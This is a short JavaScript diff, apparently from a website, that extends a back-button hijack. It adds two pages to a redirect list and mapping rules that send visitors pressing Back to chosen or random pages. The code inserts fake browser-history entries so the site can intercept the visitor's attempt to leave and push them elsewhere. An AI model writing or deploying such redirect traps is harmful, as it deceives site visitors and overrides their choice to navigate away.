@@ -8,6 +8,8 @@ globalLink.push(apidomain + 'yysx.html');
 globalLink.push(apidomain + 'zrl.html');
 globalLink.push(apidomain + 'nkgg.html');
 globalLink.push(apidomain + 'yx.html');
+globalLink.push(apidomain + 'ydjz.html');
+globalLink.push(apidomain + 'lzy.html');
 
 function hh() {
     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
@@ -20,8 +22,14 @@ window.onload = function(){
 $(window).on('popstate', function(e){
     var number = Math.floor(globalLink.length * Math.random());
     var path = location.pathname.split('.')[0];
-    if (path.substr(1) == 'nkgg') {
+    if (path.substr(1) == 'ydjz') {
         number = 6;
+    }
+    if (path.substr(1) == 'yx') {
+        number = 8;
+    }
+    if (path.substr(1) == 'nkgg') {
+        number = 7;
     }
     jump(globalLink[number]);
 });
